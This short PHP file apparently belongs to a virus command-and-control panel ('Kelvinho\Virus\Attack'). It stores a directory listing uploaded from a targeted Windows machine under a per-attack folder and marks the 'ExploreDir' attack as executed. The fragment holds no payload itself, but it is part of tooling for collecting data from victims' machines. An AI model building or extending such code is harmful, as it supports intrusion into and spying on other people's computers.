<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir $this */

$this->requestData->moveFile("dirsFile", DATA_FILE . "/attacks/" . $this->getAttackId() . "/dirs.txt");
$this->setExecuted();
